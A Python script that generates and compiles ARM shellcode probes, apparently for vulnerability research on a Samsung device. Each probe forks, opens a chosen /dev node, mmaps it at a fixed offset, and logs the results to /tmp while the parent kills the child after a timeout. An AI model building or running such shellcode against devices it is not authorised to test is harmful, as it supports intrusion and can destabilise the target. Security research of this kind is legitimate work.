#!/usr/bin/env python3
import argparse
import subprocess
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
ZIG = ROOT / "tools" / "zig" / "zig-x86_64-windows-0.15.1" / "zig.exe"
OUT = ROOT / "outputs" / "samsung-m5" / "pocs"


TEMPLATE = r""".syntax unified
.arm
.global _start

_start:
    push {{r4-r11, lr}}
    b code_start

.align 2
devpath:
    .asciz "{devpath}"
outpath:
    .asciz "{outpath}"
.align 2
timespec:
    .word 2
    .word 0
result:
    .word 0x544d4d50
    .word 0xffffffff
    .word 0xffffffff
    .word 0xffffffff
    .word 0xffffffff

code_start:
    adr r10, devpath
    adr r11, outpath
    adr r8, result

    mov r0, #9
    str r0, [r8, #4]
    bl write_result

    mov r7, #2
    svc #0
    str r0, [r8, #8]
    mov r1, #8
    str r1, [r8, #4]
    bl write_result
    cmp r0, #0
    beq child

parent:
    mov r4, r0
    adr r0, timespec
    mov r1, #0
    mov r7, #162
    svc #0

    mov r0, r4
    mov r1, #9
    mov r7, #37
    svc #0

    mov r0, #0
    pop {{r4-r11, pc}}

child:
    mov r0, #1
    str r0, [r8, #4]
    bl write_result

    mov r0, r10
    movw r1, #0x1002
    movt r1, #0x0010
    mov r2, #0
    mov r7, #5
    svc #0
    str r0, [r8, #8]
    mov r6, r0

    mov r0, #2
    str r0, [r8, #4]
    bl write_result

    cmp r6, #0
    blt child_exit

    mov r0, #3
    str r0, [r8, #4]
    bl write_result

    mov r0, #0
    movw r1, #0x1000
    mov r2, #3
    mov r3, #1
    mov r4, r6
    movw r5, #0x0c40
    movt r5, #0x000a
    mov r7, #192
    svc #0
    str r0, [r8, #12]

    mov r1, #4
    str r1, [r8, #4]
    bl write_result

    cmp r0, #0
    blt close_fd
    movw r1, #0x1000
    mov r7, #91
    svc #0
    str r0, [r8, #16]

close_fd:
    mov r0, r6
    mov r7, #6
    svc #0

child_exit:
    mov r0, #0
    mov r7, #1
    svc #0

write_result:
    push {{r4-r7, lr}}
    mov r0, r11
    movw r1, #0x241
    movw r2, #438
    mov r7, #5
    svc #0
    mov r4, r0
    cmp r0, #0
    blt write_done

    mov r0, r4
    mov r1, r8
    mov r2, #20
    mov r7, #4
    svc #0

    mov r0, r4
    mov r7, #6
    svc #0

write_done:
    pop {{r4-r7, pc}}
"""


def build(device: str) -> None:
    safe = device.replace("/dev/", "").replace("/", "_")
    asm = OUT / f"node_{safe}_mmap_timeout_probe.S"
    obj = OUT / f"node_{safe}_mmap_timeout_probe.o"
    bin_path = OUT / f"node_{safe}_mmap_timeout_probe.bin"
    outpath = f"/tmp/{safe}_mmap_timeout.bin"
    asm.write_text(TEMPLATE.format(devpath=device, outpath=outpath), encoding="ascii")
    subprocess.run([str(ZIG), "cc", "-target", "arm-linux-gnueabi", "-c", str(asm), "-o", str(obj)], check=True)
    subprocess.run([str(ZIG), "objcopy", "-O", "binary", "-j", ".text", str(obj), str(bin_path)], check=True)
    print(f"{bin_path} -> {outpath}")


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("devices", nargs="+")
    args = ap.parse_args()
    for device in args.devices:
        build(device)


if __name__ == "__main__":
    main()
